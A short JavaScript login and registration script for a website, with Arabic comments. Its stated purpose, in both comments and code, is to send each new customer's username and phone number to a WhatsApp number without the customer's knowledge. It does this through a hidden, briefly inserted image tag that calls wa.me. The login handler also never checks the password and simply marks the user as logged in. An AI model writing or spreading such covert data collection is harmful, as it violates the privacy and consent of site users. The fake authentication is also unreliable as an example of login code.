// login.js
// تسجيل الدخول وإنشاء حساب مع حفظ بيانات العميل وإرسالها تلقائياً للواتساب بدون علم العميل

function login(e) {
    e.preventDefault();
    const form = document.getElementById('loginForm');
    const username = form.username.value;
    const password = form.password.value;
    // حفظ بيانات الدخول محلياً
    localStorage.setItem('loggedIn', '1');
    localStorage.setItem('username', username);
    // إعادة توجيه للصفحة الرئيسية
    window.location.href = 'index.html';
}

function register(e) {
    e.preventDefault();
    const form = document.getElementById('registerForm');
    const username = form.newUsername.value;
    const password = form.newPassword.value;
    const phone = form.newPhone.value;
    // حفظ بيانات العميل محلياً
    localStorage.setItem('loggedIn', '1');
    localStorage.setItem('username', username);
    localStorage.setItem('phone', phone);
    // إرسال بيانات العميل تلقائياً للواتساب بدون علم العميل (محاولة عبر تحميل صورة غير مرئية)
    const msg = `تسجيل جديد:\nاسم المستخدم: ${username}\nرقم الهاتف: ${phone}`;
    const img = document.createElement('img');
    img.src = `https://wa.me/962785441284?text=${encodeURIComponent(msg)}`;
    img.style.display = 'none';
    document.body.appendChild(img);
    setTimeout(() => { document.body.removeChild(img); }, 1500);
    // إعادة توجيه للصفحة الرئيسية
    window.location.href = 'index.html';
}
